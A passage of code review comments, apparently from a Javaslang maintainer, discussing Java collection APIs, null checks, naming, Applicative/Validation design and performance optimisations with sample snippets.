p).\n. Is result = end when len > end? Why not len? Because the last index of the empty slice is the end of t!\nDon't know, just a question...\n. Ah - I think I've not understood/overseen end - we search until there. It is ok!\n. we do not need to check this whole if - we've already done it in lastIndexOfSlice, right?\n. we need here ~~only two args, p and length.~~ additionally length\n. while (p < length) {\n    ...\n}\n. Let's take the default impl from Traversable here, then we can remove the impls in Value, Iterator and Traversable\n. Here we can also implement the default\n. we move this to Foldable\n. we move this to Foldable\n. can be deleted because of the default impl in Foldable\n. can also be deleted\n. let's return get();\n. let's return getOption();\n. if we removed the ambiguity, this can be reverted\n. dito\n. dito\n. dito\n. No - with Valhalla we will have <any T>. Until then we stay with Function*\n. I'm not as deep involved as you - but this catched my eye - do we need this singleton any more here?\n. ok\n. yes, right\n. We provide 'user friendly' messages on NullPointerException, here:\njava\nObjects.requireNonNull(values, \"values is null\");\n. Accordingly\njava\n* @throws NullPointerException if {@code values} is null\n. foldLeft is the most concise solution here. But we cannot shortcut the loop if we visit the first None (see #779).\nI would suggest to optimize the internal implementation similar to this:\njava\nList<T> list = List.empty();\nfor (T value : values) {\n    if (value.isEmpty) {\n        return Option.none();\n    }\n    list = list.prepend(value.get());\n}\nreturn Option.some(list.reverse());\nI know, from a functional perspective this code looks ugly. But it does perform better on the non-happy path.\n. Btw - sequence::append internally does a sequence.reverse().prepend(t).reverse() for every element t. Generally use prepend instead for every element and finally a reverse().\n. Also null-check and @throws in javadoc\n. I would rewrite it accordingly to Option.sequence as commented above\n. - n should be int, then there's no need to check for null below\n- We should  use Function<? super Integer, ? extends T> in order to allow functions that operate on Number\n. line can be deleted, see above\n. yes, Stream methods should be lazy, s.th. similar to\njava\nreturn Stream.ofAll(Iterator.fill(n, f));\n. I just realized that Scala has a different name for fill(int, Function). It is tabulate:\nscala\nscala> List.tabulate(5)(n => n * n)\nres0: List[Int] = List(0, 1, 4, 9, 16)\nWe should rename the methods accordingly because we align to Scala syntax.\nNote: The name fill(int, Supplier) remains.\n. also int instead of Integer\n. Also int n, Function<? super Integer, ...\n. can be removed\n. Also int n.\nWe use Supplier<? extends Character> for the sake of completeness.\n. Also int n, Function<? super Integer, ...\n. line can be removed\n. also int n\n. Also int n, Function<? super Integer, ...\n. line can be removed\n. int n\n. Also int n, Function<? super Integer, ...\n. can be removed\n. int n\n. Also int n, Function<? super Integer, ...\n. line can be removed\n. int n\n. Also int n, Function<? super Integer, ...\n. can be removed\n. int n\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. It returns the singleton instance:\njava\npublic static <T> Vector<T> empty() {\n    return (Vector<T>) EMPTY;\n}\n. It depends on the collection type. The Seq used in Future.sequence is a Stream, which has a lazy append operation taking O(1). It works like a caching iterator. Here we use List as Seq. It has O(1) prepend and O(n) append.\nYou find a good overview on the bottom of this page.\n. point and pure are not needed, if the ap method is abstract. Instead implementations will use the actual constructor.\nThen we do not need to separate Applicative and Apply. I suggest to merge them and name the type Applicative.\n. In Javaslang we choose readable methods. Otherwise our code gets too cryptic. Let's call it apply instead of ap.\nInstead of Function1 we use Function in the case of method parameter type (Function1 extends Function).\nAs you mentioned already, here we have the same problem as with Monad.flatMap because of the lack of higher-kinded types / type constructors. We circumvented this in Monad.flatMap by having a Function arg that returns Iterator.\nHere I would give this signature a try:\njava\n<U> Applicative<U> apply(Applicative<? extends Function<? super T, ? extends U>> f);\nQuestion: How will implementations deal with an f that has a different Applicative type than the present?\nAlternative: We could add a recursive self-type Applicative<SELF extends Applicative<SELF, ?>, T> which is not a good idea.\n. Note: We recently refactored Try implementations and made Success and Failure inner types of Try to clear the way for Validation.Success and Validation.Failure.\n. Supplier<? extends T>\n. Supplier<? extends E>\n. We use forEach instead of foreach. We will get it automatically when implementing Value. However, before implementing common Javaslang interfaces we should create a working spike in order to keep the complexity low. We don't care for now.\n. Note to myself: Should be added also to Either<L, R>.\n. Without having dived into it, my feeling says that maybe there is a way to compose Applicatives without the need for builders... Need to think about it...\n. We need to override Applicative.apply and relax the signature. Impl needs to be figured out then.\n. Here we can optimize like this:\njava\nObjects.requireNonNull(f, \"f is null\");\nn = n < 0 ? 0 : n;\nList<T> list = List.empty();\nfor (int i = n - 1; i >= 0; i--) {\n    list = list.prepend(f.apply(i));\n}\nreturn list;\n. oh, we use n instead of nOrZero. Please double-check all other places.\n@ruslansennov Ruslan would overwrite the given method arg like this: n = Math.max(n, 0); ;-)\n. We should remove all static methods from Seq because it is not obvious to users which implementation is selected. If we want a Seq we have to choose it directly according to the underlying use-case. This gives the user more control about what happens.\n(Note: Also the existing Seq.ofAll, I will move it in another PR to the internal class Collections)\n. :smile: :smile:\n. Thank you, I will read a bit to get a clear picture.\n. Please make Stream.tabulate lazy: return Stream.ofAll(Iterator.tabulate(n, f));\nYou may add these methods to javaslang.collection.Iterator:\n``` java\n    static  Iterator fill(int n, Supplier<? extends T> s) {\n        return tabulate(n, anything -> s.get());\n    }\nstatic <T> Iterator<T> tabulate(int n, Function<? super Integer, ? extends T> f) {\n    Objects.requireNonNull(f, \"f is null\");\n    return new AbstractIterator<T>() {\n\n        int i = 0;\n\n        @Override\n        public boolean hasNext() {\n            return i < n;\n        }\n\n        @Override\n        protected T getNext() {\n            return f.apply(i++);\n        }\n    };\n}\n\n```\n. Yes, I know, Java's type system is frustrating sometimes. On the other hand its simplicity is also its strength.\nAccording to the Scalaz docs, Apply is \"[[scalaz.Applicative]] without point\"\nThe point method does only make sense in the presence of type constructors. Translated to Java, it is 'isomorphic' to a simple constructor.\n``` scala\nimplicit def ValidationApplicative[L: Semigroup]: Applicative[Validation[L, ?]] =\n    new Applicative[Validation[L, ?]] {\n      override def mapA, B(f: A => B) =\n        fa map f\n  def point[A](a: => A) =\n    Success(a)\n\n  def ap[A, B](fa: => Validation[L, A])(f: => Validation[L, A => B]) =\n    fa ap f\n}\n\n```\nWe will merge Apply and Applicative. Javaslang always goes the simple way - and sometimes it is also different.\nThe important thing of Applicative is (compared to Monad), that evaluation goes on regardless if we are in the Failure case or the Success case, while preserving laws.\nIMO the simplest approach is an Applicative type with a generic, recursive self-type:\n``` java\npublic interface Applicative, T> extends Functor {\n<U> Applicative<SELF, U> ap(Applicative<SELF, ? extends Function<? super T, ? extends U>> f);\n\n}\n```\nValidation then implements it like this:\n``` java\ninterface Validation extends Applicative, T> {\n@Override\n<U> Validation<E, U> ap(Applicative<Validation<E, ?>, ? extends Function<? super T, ? extends U>> f);\n\n}\n```\nUpdated the code snippets above - but don't know if it even compiles. Need time to play around with it...\nUpdated the code snippets again. I agree now that the method name should be ap instead of apply. I need to see a Validation example in order to see it is human-readable API.\n(Not sure about the E and T in Applicative above - you may know better...)\n. Thx!\n. @simonecarriero you don't need to go with it. Please replace the method with the optimization below.\n. Note: In the solution above we assume that application of f is stateless. We apply it in reverse order of i (n-1..0) instead of (0..n-1). I hope this does not produce some unexpected behavior because we cannot say if f is really stateless at runtime...\n. @simonecarriero You're right - please do it as you suggested.\n. This is the first shot using my infamous Kind type constructor fake. It is a direct translation of Scalaz's Validation Applicative (more or less). The list of errors is handled internally by the Validation, i.e. we only make the type E explicit and most probably there will be a method getFailures() or something similar which returns a List<E> if isFailure() == true.\n``` java\n// trait Apply[F[_]] extends Functor[F]\npublic interface Applicative, A> extends Functor {\n// def ap[A,B](fa: => F[A])(f: => F[A => B]): F[B]\n<B> Applicative<F, B> ap(Kind<F, ? extends Function<? super A, ? extends B>> f);\n\n@Override\n<B> Applicative<F, B> map(Function<? super A, ? extends B> f);\n\n}\n// type constructor: TYPE is split in TYPE<?> and T\ninterface Kind, T> {\n}\ninterface Validation extends Kind, A> {\n// def ap[EE >: E, B](x: => Validation[EE, A => B])(implicit E: Semigroup[EE]): Validation[EE, B]\n<B> Validation<E, B> ap(Validation<E, ? extends Function<? super A, ? extends B>> f);\n\n<B> Validation<E, B> map(Function<? super A, ? extends B> f);\n\n// implicit def ValidationApplicative[L: Semigroup]: Applicative[Validation[L, ?]]\nfinal class ValidationApplicative<E, A> implements Applicative<Validation<E, ?>, A> {\n\n    final Validation<E, A> fa;\n\n    public ValidationApplicative(Validation<E, A> fa) {\n        this.fa = fa;\n    }\n\n    // def ap[A, B](fa: => Validation[L, A])(f: => Validation[L, A => B]) = fa ap f\n    @SuppressWarnings(\"unchecked\")\n    @Override\n    public <B> ValidationApplicative<E, B> ap(Kind<Validation<E, ?>, ? extends Function<? super A, ? extends B>> f) {\n        return new ValidationApplicative<>(fa.ap((Validation<E, ? extends Function<? super A, ? extends B>>) (Object) f));\n    }\n\n    // override def map[A, B](fa: Validation[L, A])(f: A => B) = fa map f\n    @Override\n    public <B> ValidationApplicative<E, B> map(Function<? super A, ? extends B> f) {\n        return new ValidationApplicative<>(fa.map(f));\n    }\n}\n\n}\n```\nNext we could get rid of the class ValidationApplicative because Java has no implicits. However, as you already said, I don't if it is worth to make all this effort just to mark Validation as Applicative.\n. This is the shortened version I talked about (got rid of implicit workaround class):\n``` java\n// trait Apply[F[_]] extends Functor[F]\npublic interface Applicative, A> extends Functor {\n// def ap[A,B](fa: => F[A])(f: => F[A => B]): F[B]\n<B> Applicative<F, B> ap(Kind<F, ? extends Function<? super A, ? extends B>> f);\n\n@Override\n<B> Applicative<F, B> map(Function<? super A, ? extends B> f);\n\n}\n// type constructor: TYPE is split in TYPE<?> and T\ninterface Kind, T> {\n}\ninterface Validation extends Kind, A>, Applicative, A> {\n// def ap[EE >: E, B](x: => Validation[EE, A => B])(implicit E: Semigroup[EE]): Validation[EE, B]\n<B> Validation<E, B> ap(Validation<E, ? extends Function<? super A, ? extends B>> f);\n\n@Override\n<B> Validation<E, B> map(Function<? super A, ? extends B> f);\n\n// def ap[A, B](fa: => Validation[L, A])(f: => Validation[L, A => B]) = fa ap f\n@SuppressWarnings(\"unchecked\")\n@Override\ndefault <B> Validation<E, B> ap(Kind<Validation<E, ?>, ? extends Function<? super A, ? extends B>> f) {\n    return ap((Validation<E, ? extends Function<? super A, ? extends B>>) (Object) f);\n}\n\n}\n```\n. Thanks for all your efforts, Eric. The progress is great. We will fix the last details.\n\nThe signature for the overridden ap() method isn't what you wrote above, but  Applicative, B> ap(Kind, ? extends Function<? super T, ? extends B>> f).\n\nI can't reproduce it. When I copy-paste your code into IntelliJ IDEA (15.0.2 on a Mac with jdk 1.8.0_66) and change the return type of the overridden ap method to Validation<E, B> it does compile fine (within IDE and with Maven on the command line), especially the @Override does also compile. (Note: map also may have a @Override)\nMaybe our Applicative interfaces differ? Could you please check it?\n``` java\npublic interface Applicative, T> extends Functor {\n<U> Applicative<F, U> ap(Kind<F, ? extends Function<? super T, ? extends U>> f);\n\n@Override\n<U> Applicative<F, U> map(Function<? super T, ? extends U> f);\n\n}\n```\nAnd Kind looks like this:\n``` java\npackage javaslang;\npublic interface Kind, T> {\n}\n```\nThe Applicative interface would be a great addition to the algebra package. I questioned the whole package several times and tended to leave out these types because of several problems. It has taken many iterations but Monad does fit now very well into the library. If we do not give up too early we will achieve the same with Applicative.\n. Thank you for the insight. We need both accumulation styles:\n- v1.combine(v2)...combine(vn) may be used in fold/reduce.\n- The static Validation.combine(v1, v2, ..., vn) is a great shortcut. I had this in mind, too.\nDo Scalaz/Cats also use a builder? Do you have a link to source-code?\nI ask myself if it sufficient if we use tuples or functions of arity 1..8 for accumulated results. If we use validation for a html form for example, the form field will probably exceed the limit of 8. It is not a good idea to blow up the arity of tuples and functions (Scala has 22).\nOn the other hand it is not possible to use an IndexedSeq instead, holding the accumulated results, because the combined Validations have different Success component types.\nHList to the rescue?\nExample:\n``` scala\ndef validate(musician: Musician): StringValidation[Musician] = {\n    import scalaz.\n    import scalaz.Scalaz.\ndef validCurrentBand(band: Option[Band]): StringValidation[Option[Band]] = ???\n\ndef validName(name: String): StringValidation[String] = ???\n\ndef validateAge(born: LocalDate): StringValidation[LocalDate] =\n  if (born.isAfter(LocalDate.now().minusYears(12))) \"too young\".failure\n  else born.success\n\ndef validInstrument(instruments: Seq[Instrument]): StringValidation[Seq[Instrument]] = ???\n\n(validName(musician.name)\n  |@| atLeast12(musician.born)\n  |@| validInstrument(musician.instruments)\n  |@| validCurrentBand(musician.currentBand))(_ => musician)\n\n}\n```\n(taken from https://www.innoq.com/de/blog/validate-your-domain-in-scala/)\n. Let's move the discussion to the issue :) #803\n. Alright!\n. There is a reason that (T) this does not check. It is Convertible<T> and cannot be cast to T.\nI reopened #968 and already fixed it locally. PR comes soon...\n. only deleted code is good code :-)\n. We call it Kind2 and move out of the javaslang/control package into the javaslangpackage.\nMaybe I will later generate Kind1..Kindn but that's another story.\n. Let's name it getError(). It is conform to getCause() of Try.\n. ok, value may be null!\n. Please add a check Objects.requireNonNull(supplier, \"supplier is null\");\n. Please add a check Objects.requireNonNull(error, \"error is null\");\n. Please add a check Objects.requireNonNull(supplier, \"supplier is null\");\n. Please add checks\njava\nObjects.requireNonNull(v1, \"v1 is null\");\nObjects.requireNonNull(v2, \"v2 is null\");\n. Please add null-checks for v1, v2, v3\n. Please add null-checks for fail and success\n. Please null-check f\n. please null-check fail and success\n. please null-check f\n. please null-check v\n. please null-check f\n. please null-check v\n. A general thing: Please let us choose full variable names, e.g. validation instead of v, same for v1, v2. I think it increases the readability of our API. It is ok that the lines get slightly longer.\n. We stay with f as abbr. for function. It is very common and well known from math and FP.\n. see Invalid.forEach\n. Please make the constructor private to be consistent with the other controls. Instances are created via the Validation API.\n. Please make the constructor private (see Invalid).\n. I would pull that method out of Valid and Invalid into the Validation interface:\njava\nObjects.requireNonNull(f, \"f is null\");\nif (isValid()) {\n    f.accept(get());\n}\n. Please\n- move the ValidationBuilder* into the Validation interface. I see them as '2nd level API', they should not be accessed directly, we use Validation API instead (some kind of 'single point of contact').\n- 'flatten' the ValidationBuilders, i.e. Validation.ValidationBuilder, Validation.ValidationBuilder3, ...\n- make the classes final\n- make the constructors private\n. Let's rename nodes to values\n. here we should use the lazy Collections.tabulate(n, f) method\n. here we should also use the lazy Collections.tabulate(n, f) method\n. No, it needs to be public/accessible for callers of the API. We place it in the Validation interface.\nThis is similar to all the nested Match interfaces. We use this pattern in many places (Try.Success/Failure, Option.Some/None, ...). It can be seen as some kind of internal DSL. The Builders are needed to technically ensure that we get our types right but in first place they are not needed by our business domain (which is also technical here but that's only a matter of abstraction).\n. I would flatten the builders for reasons of simplicity. We may decide in future to increase the number of Tuples. This would lead to an increased depth of Builder classes which is not practical (javadoc for example).\n. For non-sorted Maps, e.g. HashMap, it is a singleton (I think).\nFor sorted Maps, e.g. TreeMap, it is no singleton because of the Comparator.\nMaybe we can add a abstract class AbstractSortedMapTest extends AbstractMapTest to overwrite it for sorted Maps?\n. You are right.\n. Can't we just overwrite the method emptyShouldBeSingleton and let AbstractMapTest return true and TreeMapTest return false? Then the tests should run, right?\nSame for AbstractSetTest and AbstractSortedSetTest...\n. Good!\n. both methods look very good!\n. All Either & Projection methods look perfect\n. Yes, very good to move it to Traversable again. I did it, too, in a local branch.\nThe javadoc line <li>{@link #contains(Object)}</li> needs to be removed in class Value\n. I think element can stay of type Character because Character is a final class. The we do not need the cast in the line below.\n. The cast (K) key might fail, right? But a check with key instanceof K does also not work because of type erasure.\n. cast here also unsafe\n. This cast is also unsafe. Tuple2 is final, therefore we don't need to use Object here I think.\n. cast (K) key is unsafe\n. also unsafe cast\n. Yes.\nI've looked into Java 8's TreeMap methods getEntry(Object key) and getEntryUsingComparator(Object key). (TreeMap is internally used by TreeSet). There they do also unchecked cases like (K) key or (Comparable<? super K>) key.\nKnowing this, the above class casts in this PR are fine, maybe...\n. ok, no problem, then contains(object)\n. better! :-)\n. I've searched the API docs and think we can do a little tweak - replacing the Function1<Integer, Integer> with IntUnaryOperator. In our special case it would prevent auto-boxing/unboxing of int values.\n. Accordingly this could be replaced by ToIntFunction. I think it is a only a slight improvement but then we got the most out of it.\nI was recently asked why I do not always use Javaslang Functions myself (within Javaslang). For consumers I try to use the most general function, mostly JDK API, like Function, BiFunction, etc. Producers return the most specfic types, E.g. Seq extends Function1<Integer, T> instead of Function<Integer, T>. Could be also IntFunction. These @FunctionalInterfaces drive me crazy :-) I wished there were no primitive types in Java and that Function1 and Function were the same.\n. I'm really impressed by the AppendElements addition! Very cool! :-)\n. The name is ok!\n. oh my gosh, yes!!\n. I would not move this method to AbstractMap. For each remove corresponds to a wrap(delegate.remove(element)). But we should first delegate.remove(element) for all elements and finally wrap the result (once). This saves n intermediate instances.\n. Thanks. I know - a lot of work with the repetitions in the collection classes o_O\n. typo: s/Emtpy/Empty/\n. java\nObjects.requireNonNull(values, \"values is null\");\nMany thanks for your contribution!\n. For objects we provide human readable NullPointerExceptions. Please add a\njava\nObjects.requireNonNull(clazz, \"clazz is null\");\n. 6-eyes principle :-)\n. Thx!\nAdding a <T> Gen<T> choose(Iterable<T> values) would scale best. We could use java.util collections and javaslang collections.\nI would implement it similar to static <T> Gen<T> oneOf(Iterable<Gen<T>> generators) but using the new choose(E[])\n. I will make Stack an ordinary interface having only a few Stack-related methods and which don't extends LinearSeq. A few people discussed about that on gitter and I made a poll. Scala has removed it entirely but having a simple interface should be ok. I will take care of the javadoc in order not to confuse users whether to to use prepend or push on a List...\n. haha, I was also tempted to remove it entirely... but we will go with a thin interface.\n. transform is the swiss-army-knife of the methods. It allows us to return an object that is derived from the current object in a fluent manner. Not more, not less. It is up to the caller what type of object is returned.\nExample:\nGiven an Option<?> o = Option.none();, instead of\njava\n// non-fluent / imperative API\nfinal String s;\nif (o.isEmpty()) {\n    s = \"None\";\n} else {\n    s = \"Some\";\n}\nString result = s.toUpperCase();\nwe write\njava\n// fluent API\nString result = o.transform(self -> self.isEmpty() ? \"None\" : \"Some\").toUpperCase();\n. @kmarwood A good test for transform on None would be\njava\nassertThat(Option.none().transform(self -> self.isEmpty() ? \"ok\" : \"failed\")).isEqualTo(\"ok\");\nCould you add that, please?\n. Good finding! As far as I can see the semantic does not change because in the == case the loop ended and the fall-back return of the method does the same.\n. This is a valid optimization. Please revert it according to my comment.\n. Very nice :-)\nPlease move the new methods above line 72 // -- Predicate combinators in order we do not confuse it with the predicate combinators.\nThanks!\n. Thank you Grzegorz.\nWhat is your opinion about the names isNotNull vs. nonNull?\nI like that isNotNull has the prefix 'is', which is typical for predicates. Personally I'm used to it.\nI like about nonNull that it is a Java standard and that it is shorter. Personally I'm not used to it.\nOnce we defined the predicates, they should stay untouched to keep the API stable.\n. We added some of these type hints because of Eclipse errors. Most of us use IntelliJ IDE.\nLet's remove it though.\n. SuppressWarnings can also be removed\n. SuppressWarnings can also be removed\n. SuppressWarnings can also be removed\n. SuppressWarnings can also be removed\n. Thanks, that helps. Naming :-) nonNull can be added later, if needed.\n. Hi Ruslan,\nyeah, Multimap is coming :)\nWhy are back and emptyContainer package-private? Can they be made protected?\n. These three methods maybe could also be protected.\n. I think it can be Tuple2 instead of ? extends Tuple2.\nFor K2 and V2 I'm not sure but probably we do not need the ? extends because this method is private.\n. I had to look two times but I think using Queue is correct. The rear List is implicitly reversed when the finisher is called. Ok!\n. nice ascii art separator ;-)\n. Do we not need also to @Override the equals method here?\n. We should make the instance variables add and remove and the constructor ContainerType private.\n. I would move the value-provider to the outside of the loop. Then we make the type check only once.\njava\nfinal java.util.Map<K, Collection<V>> javaMap = new java.util.HashMap<>();\nfinal Supplier<Collection<V>> javaContainerSupplier;\nif (containerType == SEQ) {\n    javaContainerSupplier = java.util.ArrayList::new;\n} else if (containerType == SET) {\n    javaContainerSupplier = java.util.HashSet::new;\n} else if (containerType == SORTED_SET) {\n    javaContainerSupplier = java.util.TreeSet::new;\n} else {\n    throw new IllegalStateException(\"Unknown ContainerType: \" + containerType);\n}\nfor (Tuple2<K, V> t : this) {\n    javaMap.computeIfAbsent(t._1, k -> javaContainerSupplier.get()).add(t._2);\n}\nreturn javaMap;\nDon't know if the throw is possible there or if the compiler will complain that javaContainerSupplier is uninitialized. If so, we could create a private method getJavaContainerSupplier()...\n. I think we can write Tuple2 instead of ? extends Tuple2. Tuples are final.\n. Dito\n. Dito\n. Dito... I will not mark the other ? extends Tuple occurrences. I'm sure I'll miss one. Would be best to make search-replace.\n. ~~Better throw new IllegalStateException(\"Unknown container type: \" + containerType);, also in all other places.~~\nOops - it is a test :-)\n. ok\n. Yes we can do it in a separate issue. In many places I've already done it I think. See #1241\n. We can do that. I'm working on a simplification of equals/hashcode, see #1242. Before merging it I will take a look again at the MM equals/hashCode impls.\nPR #1242 is still work in progress.\nCurrently it is not fully working because of the order of elements in HAMT equals.\nAlso the HAMP hashCode needs to be improved. Currently XOR accumulates the hashCodes because it is symmetric (e.g. a XOR b == b XOR a). That is important because a HAMT represents a Set, which has no order of elements. The hashCode has to be equal, no matter how elements are ordered. Vector and LinkedHash... collections are based on HAMT but do call other equals/hashCode methods that respect the order.\n. Ok\n. Yes, in my tests I had collisions. Maybe we both could take at equals and hashCode impl in HAMT...\n. Add intance variable int size, which is calculated at construction time.\n. Is it the same as this?\njava\nfinal StringBuilder sb = padding(element, length - back.length()).append(back);\n. +1 for using length <= thisLen and adding a javadoc comment to Seq.java#leftPadTo, sth. like:\njava\n/**\n ...\n * <p>\n * Please note that lazily-evaluated Seq implementations need to process all elements in order to gather the overall length.\n ...\n */\n\nA second thing: We should also unify the if-clauses in all methods by using an else branch instead of an if-guard and evaluate the length only once by introducing a local variable.\njava\nfinal int thisLength = length();\nif (length <= thisLength) {\n    ...\n} else {\n    ...\n}\n(In all classes)\nMany thanks!\n. Hi @talios, finally I'm able to answer... Thanks - the code looks great.\nInstead of fixed and forAll I would name the methods of(T...) and ofAll(Gen) to follow the naming scheme of the collections. What do you think?\nWe already have gen.arbitrary() but I think having Arbitrary.ofAll(Gen) is an intuitive place to look for a factory.\n. Your questions of the prev PR:\n- We do not have an in-place swap. This is not possible for Tuple2 because of the generic types T1 != T2 (wlog)\n- Lets implement it as iterator with a boolean switch = !switch state to avoid new Tuple instances:\njava\nIterator<Gen<T>> iter = new Java.util.Iterator<>() {\n    boolean switch = false;\n    hasNext() = true\n    next() = {\n        gen = switch ? ... : ...;\n        seitch = !switch;\n        return gen;\n    }\n}\nreturn rnd -> iter.next().apply(rnd);\n. @paplorinc Sorry for the late response - I returned from holidays.\nI recently removed all lazy types from internal collection instance vars like size and hash. For now please do not use Lazy for size. We trade memory for cpu cycles. If needed we may change it later without the need to change public API or Tree semantics.\n. Currently most of us use IntelliJ IDEA's \"organize imports\" feature. The IDAE settings are included in the repo (see folder .ide). I have no strong opinion regarding imports. The generated sources' import section differs too.\n. nodeCount() and size() should return this.size.\nthis.size() is initialized within the constructor (using fold...)\n. @paplorinc @ruslansennov ok, for trees with a huge branching factor it may be worth saving the time - let's experiment with it. I'm mainly interested in saving the memory. Ruslan, the 48 bytes are just for the reference, not for the whole Lazy object, aren't they? We also have a Supplier within the Lazy etc.\n. @ruslansennov \n\nIt is size of object. I believe that reference's size is smaller :)\n\nsounds good\n@pivovarit  Update: @paplorinc thx for investigation and sorry for not mentioning you - it was an auto-completion error by me :)\nMany thanks for your investigation! for now we should not optimize Lazy - the current impl is bulletproof and easy. @jbgi also made some basic benchmarks comparing different methods for lazy evaluation (that are used in scalaz) and it turned out that the current impl is as fast as the other methods.\nI'm not happy to increase the GC significantly. GC decreases the overall time-performance of the application. So the time-benefit of using Lazy instances may be reduced by having more time-consuming GCs.\nI think it depends on the use-case what is the best solution. Also: How probable is it that size() is called? If the internal implementation of the collection methods will depend on size() calls (we've done that for optimizations in other collections) then it comes handy to have size already computed (we save memory and GC). Also when size() is not called at all in some applications then the Lazy instances are unnecessary.\nHaving a Lazy size is an optimization. Maybe it is premature because we currently have no reason to optimize the implementation. I like to implement the simplest solution possible and optimize when necessary.\n. This is a very good question! In 2013 (I think) I attended the Coursera course progfun by Martin Odersky/EPFL. There was an assignment where we had to implement some data structure using traits. In my first submission I missed some points because I didn't implement a method similar to this default method.\nI thought about it and now I design the interfaces/classes the way that only methods that are atomic / cannot be deduced by other methods are implemented within the implementing classes (like List.Nil, List.Cons). Other methods are implemented as default method within the interface (e.g. List). I think in general this makes it more easy to provide different implementations for one interface - all reduces to the most important methods.\n. just one commit away from merging the PR :-) we do not need this method here because Tree has a default nodeCount() method.\n. @paplorinc \n\nSo you're simply using it for multiple implementation inheritance (traits style), right?\n\nYes. But there is one more reason: High cohesion. It is nice to see the behavior of a function (/method) in one place. In our example we have just two distinct impls (Empty and Node) but there are situations where we might have even more (e.g. Root, Inner, Leaf). Spreading the behavior of one method over the classes makes an algorithm hard to read.\nAn Interface/Trait is like a blueprint of a type, we see how it basically works. By looking at the impls we see the specific characteristics. Those are often one-pagers.\n. @pivovarit yep, you're right - I recieved only a notification of your comment.\nGreat work, thx!\n. yes, using else if is correct here. in other places we use if-guards without else branch but that pattern does not apply here.\n. Classical naming question - highly opinionated. I would stay with M because it is specific to AbstractMap which captures commonalities between Map impls. The M definitely denotes a Map type. Technically it is used as a result type but it does not need necessarily to. M may be (theoretically) used in arbitrary places, e.g. return type, local var etc...\nIf we need such param for an AbstractQueue it will be Q. That type will not be related to AbstractMap.\n. looks good\n. yes, more readable now!\n. please try not to reformat existing code. Do you use Eclipse? Most of us use IntelliJ IDEA. The repo includes the IDE settings...\n. yes, sounds reasonable!\n. does it need an @Override\n. This needs to be implemented in Traversable (lastOption actually is)\n. An iterator actually internally is mutable, like in Scala. Therefore calling multiple intermediate operations might produce unexpected results (see javadoc).\n. yes, please revert, we all should use the same settings\n. Good!\nLet's switch the conditions, too: Option.when(i >= 0 && i < length(), ...). Then we omit the length() call if i < 0.\n. Ohh sh... - the implementation of Option.when is broken: if the supplier returns a null we create currently no Some instance, see https://github.com/javaslang/javaslang/blob/master/javaslang/src/main/java/javaslang/control/Option.java#L137\nOption.when needs to be fixed to call some(...) instead of of(...)\n. See #1272\n. Yes, we should hide it. A good place is within javaslang.collection.Collections as static method.\n. good catch\n. Nice!\n. yep\n. that makes sense! the less code the better.\n. for reason of consistency we could add a final here\n. ok - will merge now!\n\nI think Java is going in the 'implicitly final' direction though\n\nthat, Sir, would be super-awesome!\n. yep\n. This is a great idea! However, we decide not to have delegating default implementations with return type casts in our interfaces. Instead let's add the method(s) to our javaslang.collection.Collections class:\njava\n@SuppressWarnings(\"unchecked\")\nstatic <C extends Traversable<T>, T> C removeAll(C collection, Iterable<? extends T> elements) {\n    Objects.requireNonNull(elements, \"elements is null\");\n    final Set<T> removed = HashSet.ofAll(elements);\n    return (C) collection.filter(e -> !removed.contains(e));\n}\n(We don't need to check if the given collection is null because it is for internal use only and the calling collections will always provide this.)\nBonus points: We isolate the unsafe cast.\n. good!\n. Sometimes I use a special indentation to reduce cyclomatic complexity by having only one return statement:\njava\nreturn sb.length() == 0        ? EMPTY :\n       sb.length() == length() ? this  : of(sb.toString());\nBut no formatter will handle this sort of whitespace :)\nUsing if/else if is ok!\n. yes, good!\n. I ask myself if we could omit the isEmpty check, like this:\njava\nif (isEmpty()) {\n    return this;\n} else {\n    final List<T> that = reverse();\n    return that.tail().foldLeft(of(head()), (x, xs) -> xs.prepend(element).prepend(x));\n}\n. We should save even more instances by directly prepending to Lists instead of appending to Queues:\njava\nList<T> left = empty(), right = empty();\nfor (T t : this) {\n    if (predicate.test(t)) {\n        left = left.prepend(t);\n    } else {\n        right = right.prepend(t);\n    }\n}\nreturn Tuple.of(left.reverse(), right.reverse());\n. Nice!!\n. yes, nice solution!\n. Yep, Queue has two Lists inside and we only use the rear list (which finally is effectively reversed), the front List is wasted.\nBest would be to use the code snippet of my last comment (and not java.util.ArrayList).\n. good!\n. Yep, I see what you meant that CharSeq is special.\n. Let's test both to be robust regarding refactoring. The implementation detail may change.\n. the is a space missing between double quotes and plus: \\\" + instead of \\\"+ (see generated code)\n. No, we do not need to worry, this is how Java 8's impl of java.lang.String.split works:\n``` java\n    public String[] split(String regex, int limit) {\n        / fastpath if the regex is a\n         (1)one-char String and this character is not one of the\n            RegEx's meta characters \".$|()[{^?+\\\", or\n         (2)two-char String and the first char is the backslash and\n            the second is not the ascii digit or ascii letter.\n         /\n        char ch = 0;\n        if (((regex.value.length == 1 &&\n             \".$|()[{^?+\\\".indexOf(ch = regex.charAt(0)) == -1) ||\n             (regex.length() == 2 &&\n              regex.charAt(0) == '\\' &&\n              (((ch = regex.charAt(1))-'0')|('9'-ch)) < 0 &&\n              ((ch-'a')|('z'-ch)) < 0 &&\n              ((ch-'A')|('Z'-ch)) < 0)) &&\n            (ch < Character.MIN_HIGH_SURROGATE ||\n             ch > Character.MAX_LOW_SURROGATE))\n        {\n            int off = 0;\n            int next = 0;\n            boolean limited = limit > 0;\n            ArrayList list = new ArrayList<>();\n            while ((next = indexOf(ch, off)) != -1) {\n                if (!limited || list.size() < limit - 1) {\n                    list.add(substring(off, next));\n                    off = next + 1;\n                } else {    // last one\n                    //assert (list.size() == limit - 1);\n                    list.add(substring(off, value.length));\n                    off = value.length;\n                    break;\n                }\n            }\n            // If no match was found, return this\n            if (off == 0)\n                return new String[]{this};\n        // Add remaining segment\n        if (!limited || list.size() < limit)\n            list.add(substring(off, value.length));\n\n        // Construct result\n        int resultSize = list.size();\n        if (limit == 0) {\n            while (resultSize > 0 && list.get(resultSize - 1).length() == 0) {\n                resultSize--;\n            }\n        }\n        String[] result = new String[resultSize];\n        return list.subList(0, resultSize).toArray(result);\n    }\n    return Pattern.compile(regex).split(this, limit);\n}\n\n```\n(example taken from Java's original source code)\n. Yep, it doesn't cache. I would do the same and not cache (for now).\n. Nice catch!\n. This protection is necessary. But I ask myself why it has been called with a SerializableComparator as argument. Once a plain Comparator is changed to be a SerializableComparator it should not be necessary to call SerializableComparator.of again. At least I didn't have to when 